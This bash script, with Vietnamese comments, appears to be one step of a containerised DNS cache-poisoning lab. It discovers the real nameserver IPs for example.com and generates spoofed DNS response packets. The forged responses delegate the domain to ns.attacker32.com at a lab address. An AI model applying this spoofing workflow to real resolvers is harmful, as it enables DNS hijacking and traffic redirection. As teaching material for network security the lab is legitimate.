#!/bin/bash
# Muc 4.3: Sinh DNS Response gia mao. IP NS that duoc phat hien luc chay.

set -u

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PROJECT_LAB="$(cd "${SCRIPT_DIR}/.." && pwd)"
ATTACK_DIR="${PROJECT_LAB}/attack"
GEN_RESPONSE_HOST="${ATTACK_DIR}/gen_response.py"

CONTAINER_ATTACKER="attacker-10.2.6.1"
CONTAINER_DNS="local-dns-server-10.2.6.53"
ATTACK_MOUNT="/attack"
PYTHON_BIN="python3"
NAME_FORMAT='{{.Names}}'

DOMAIN_EXAMPLE="example.com"
RESOLVER_PUBLIC="8.8.8.8"
CLASSIC_NS_IP="108.162.192.162"
NS_IP_LIST_FILE="${ATTACK_DIR}/ns_ips.txt"
RESP_BIN_NAME="ip_resp.bin"
RESP_BIN_HOST="${ATTACK_DIR}/${RESP_BIN_NAME}"

names=""
ns_names=""
ns_ips=""
first_ip=""
idx=0
fail=0

note() { printf '\n===== %s =====\n' "$1"; }
pass() { echo "PASS: $1"; }
bad() { echo "FAIL: $1"; fail=1; }

if [[ ! -f "$GEN_RESPONSE_HOST" ]]; then
  echo "Khong thay script du an: $GEN_RESPONSE_HOST"
  exit 1
fi

names="$(sudo docker ps --format "$NAME_FORMAT")"
if ! grep -qx "$CONTAINER_ATTACKER" <<<"$names" || ! grep -qx "$CONTAINER_DNS" <<<"$names"; then
  echo "Thieu container. Chay 00_init.sh truoc."
  exit 1
fi

note "Phat hien NS va A record hien tai cua ${DOMAIN_EXAMPLE}"
ns_names="$(sudo docker exec "$CONTAINER_DNS" dig +short NS "$DOMAIN_EXAMPLE" @"$RESOLVER_PUBLIC" || true)"
echo "NS names:"
echo "$ns_names"
ns_ips="$(sudo docker exec "$CONTAINER_DNS" bash -c "
for ns in \$(dig +short NS ${DOMAIN_EXAMPLE} @${RESOLVER_PUBLIC}); do
  dig +short A \"\$ns\" @${RESOLVER_PUBLIC}
done" | sort -u || true)"
echo "NS A records:"
echo "$ns_ips"
printf '%s\n' "$ns_ips" > "$NS_IP_LIST_FILE"

if [[ -z "$ns_ips" ]]; then
  bad "Khong lay duoc NS IP"
  echo "KET QUA GEN RESPONSE: FAIL"
  exit 1
fi
pass "Da luu danh sach NS IP vao ${NS_IP_LIST_FILE}"

note "Tao ip_resp_*.bin cho moi NS IP (attack se nap tat ca)"
sudo docker exec "$CONTAINER_ATTACKER" bash -c "cd ${ATTACK_MOUNT} && rm -f ip_resp*.bin"
idx=0
while IFS= read -r ip; do
  [[ -z "$ip" ]] && continue
  sudo docker exec "$CONTAINER_ATTACKER" bash -c "cd ${ATTACK_MOUNT} && ${PYTHON_BIN} gen_response.py ${ip} ip_resp_${idx}.bin"
  idx=$((idx + 1))
done <<< "$ns_ips"

first_ip="$(echo "$ns_ips" | head -1)"
if echo "$ns_ips" | grep -qx "$CLASSIC_NS_IP"; then
  first_ip="$CLASSIC_NS_IP"
fi
sudo docker exec "$CONTAINER_ATTACKER" bash -c "cd ${ATTACK_MOUNT} && ${PYTHON_BIN} gen_response.py ${first_ip} ${RESP_BIN_NAME} && ls -la ip_resp*.bin"

echo "IP nguon spoof chinh (ip_resp.bin): $first_ip"
echo "UDP sport: 53"
echo "IP dich  : 10.2.6.53"
echo "UDP dport: 44444"
echo "Authority: ${DOMAIN_EXAMPLE} NS ns.attacker32.com"
echo "Additional: ns.attacker32.com A 10.2.6.153"

if [[ -f "$RESP_BIN_HOST" ]]; then
  pass "Da tao ${RESP_BIN_HOST}"
else
  bad "Thieu ${RESP_BIN_HOST}"
fi
if [[ "$idx" -gt 0 ]]; then
  pass "Da tao ${idx} mau ip_resp_*.bin"
else
  bad "Khong tao duoc mau Response"
fi

echo
if [[ "$fail" -eq 0 ]]; then
  echo "KET QUA GEN RESPONSE: PASS"
else
  echo "KET QUA GEN RESPONSE: FAIL"
fi
exit "$fail"
